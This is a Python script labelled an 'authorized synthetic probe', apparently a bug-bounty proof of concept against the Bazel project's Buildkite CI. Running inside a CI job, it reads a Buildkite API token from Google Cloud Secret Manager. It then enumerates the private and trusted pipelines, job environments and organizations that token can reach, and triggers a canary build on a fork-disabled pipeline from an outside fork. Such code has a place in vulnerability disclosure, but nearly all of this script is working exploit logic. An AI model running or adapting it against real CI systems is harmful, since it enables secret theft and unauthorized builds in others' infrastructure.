#!/usr/bin/env python3
"""Authorized synthetic probe for B-0244; never prints credential values."""

import json
import os
import subprocess
import sys
import urllib.error
import urllib.request


NONCE = "hi_from_robert:d21766e5488dc00f"
CANARY_COMMIT = "HEAD"
CANARY_BRANCH = "b0244-buildkite-scope-d21766e5488dc00f"
CANARY_PIPELINE = "culprit-finder"
API = "https://api.buildkite.com/v2"


def emit(result, visible=True):
    print("STABLE_B0244 " + result.get("state", "unknown"))
    if visible:
        print(
            "B0244_RESULT " + json.dumps(result, sort_keys=True, separators=(",", ":")),
            file=sys.stderr,
        )


def request(token, method, path, payload=None):
    body = None
    headers = {"Authorization": "Bearer " + token}
    if payload is not None:
        body = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(API + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=20) as response:
            raw = response.read()
            try:
                parsed = json.loads(raw) if raw else None
            except json.JSONDecodeError:
                parsed = {"text_response": True}
            return response.status, parsed
    except urllib.error.HTTPError as error:
        raw = error.read()
        try:
            parsed = json.loads(raw) if raw else None
        except json.JSONDecodeError:
            parsed = {"message": raw.decode("utf-8", "replace")[:200]}
        return error.code, parsed


def main():
    label = os.environ.get("BUILDKITE_LABEL", "")
    shard = os.environ.get("BUILDKITE_PARALLEL_JOB", "")
    if "Ubuntu 24.04 LTS (shard 1)" not in label or shard not in ("", "0"):
        emit({"nonce": NONCE, "state": "not-designated-job"}, visible=False)
        return

    job_id = os.environ.get("BUILDKITE_JOB_ID", "unknown")
    guard = "/tmp/b0244-" + job_id + ".done"
    try:
        descriptor = os.open(guard, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
        os.close(descriptor)
    except FileExistsError:
        emit({"nonce": NONCE, "state": "already-ran"})
        return

    result = {
        "nonce": NONCE,
        "state": "started",
        "build": os.environ.get("BUILDKITE_BUILD_NUMBER"),
        "job": job_id,
        "pipeline": os.environ.get("BUILDKITE_PIPELINE_SLUG"),
        "commit": os.environ.get("BUILDKITE_COMMIT"),
    }

    try:
        token = subprocess.check_output(
            [
                "gcloud",
                "secrets",
                "versions",
                "access",
                "latest",
                "--secret=bazel-bazelcipy-BuildkiteClient-token",
                "--project=bazel-untrusted",
            ],
            text=True,
            stderr=subprocess.DEVNULL,
            timeout=20,
        ).strip()
        result["secret_access"] = True

        status, token_info = request(token, "GET", "/access-token")
        result["access_token"] = {
            "status": status,
            "scopes": sorted(token_info.get("scopes", [])) if isinstance(token_info, dict) else [],
            "description": token_info.get("description") if isinstance(token_info, dict) else None,
            "created_at": token_info.get("created_at") if isinstance(token_info, dict) else None,
            "expires_at": token_info.get("expires_at") if isinstance(token_info, dict) else None,
        }

        probes = {
            "current_pipeline": "/organizations/bazel/pipelines/bazel-bazel-github-presubmit",
            "fork_disabled_pipeline": "/organizations/bazel/pipelines/" + CANARY_PIPELINE,
            "protected_downstream_pipeline": "/organizations/bazel/pipelines/bazel-at-head-plus-downstream",
            "private_buildfarm_admin": "/organizations/bazel/pipelines/buildfarm-admin-farmer",
            "private_sandboxed_api": "/organizations/bazel/pipelines/sandboxed-api",
            "trusted_publish_pipeline": "/organizations/bazel-trusted/pipelines/publish-bazel-binaries",
            "own_job_env": "/organizations/bazel/jobs/" + job_id + "/env",
            "own_job_artifacts": "/organizations/bazel/jobs/" + job_id + "/artifacts",
            "own_job_log": "/organizations/bazel/jobs/" + job_id + "/log",
        }
        result["reads"] = {}
        for name, path in probes.items():
            read_status, read_body = request(token, "GET", path)
            entry = {"status": read_status}
            if name == "own_job_env" and read_status == 200 and isinstance(read_body, dict):
                environment = read_body.get("env", read_body)
                if isinstance(environment, dict):
                    entry["keys"] = sorted(environment.keys())
            result["reads"][name] = entry

        org_status, orgs = request(token, "GET", "/organizations")
        org_slugs = {
            organization.get("slug")
            for organization in orgs
            if isinstance(organization, dict)
        } if isinstance(orgs, list) else set()
        result["organization_access"] = {
            "status": org_status,
            "count": len(org_slugs),
            "bazel": "bazel" in org_slugs,
            "bazel_trusted": "bazel-trusted" in org_slugs,
        }

        known_fork_disabled = (
            "rules-graalvm",
            "btwiuse-k0s",
            "tools-android",
            "subpar",
            "sandboxed-api",
            "buildfarm-admin-farmer",
            "bcsgh-utilities",
            "bcsgh-tbd",
            "bcsgh-stl-to-ps",
            "bcsgh-tbd-http",
            "bcsgh-bazel-rules",
        )
        result["known_fork_disabled_pipeline_status"] = {}
        for pipeline_slug in known_fork_disabled:
            pipeline_status, _ = request(
                token,
                "GET",
                "/organizations/bazel/pipelines/" + pipeline_slug,
            )
            result["known_fork_disabled_pipeline_status"][pipeline_slug] = pipeline_status

        payload = {
            "commit": CANARY_COMMIT,
            "branch": CANARY_BRANCH,
            "message": "[authorized B-0244 canary] " + NONCE,
            "clean_checkout": True,
            "ignore_pipeline_branch_filters": True,
            "pull_request_repository": "https://github.com/benr00t3d/bazel.git",
            "env": {
                "B0244_NONCE": NONCE,
                "PROJECT_NAME": "B0244_NONEXISTENT_d21766e5488dc00f",
            },
        }
        list_status, builds = request(
            token,
            "GET",
            "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds"
            + "?branch=" + CANARY_BRANCH + "&per_page=20",
        )
        existing = None
        if list_status == 200 and isinstance(builds, list):
            existing = next(
                (
                    build
                    for build in builds
                    if build.get("commit") == CANARY_COMMIT
                    or build.get("message") == payload["message"]
                ),
                None,
            )

        if existing is not None:
            build_status, build_body = 200, existing
            disposition = "reused"
        else:
            build_status, build_body = request(
                token,
                "POST",
                "/organizations/bazel/pipelines/" + CANARY_PIPELINE + "/builds",
                payload,
            )
            disposition = "created" if build_status == 201 else "rejected"

        result["canary_build"] = {
            "status": build_status,
            "list_status": list_status,
            "disposition": disposition,
        }
        if isinstance(build_body, dict):
            for field in ("number", "web_url", "state", "commit", "branch", "message"):
                if field in build_body:
                    result["canary_build"][field] = build_body[field]
            if build_status not in (200, 201):
                result["canary_build"]["error"] = build_body.get("message")
        result["state"] = "complete"
    except Exception as error:
        result["state"] = "error"
        result["error"] = type(error).__name__ + ": " + str(error)[:300]
    finally:
        if "token" in locals():
            token = ""

    emit(result)


if __name__ == "__main__":
    main()
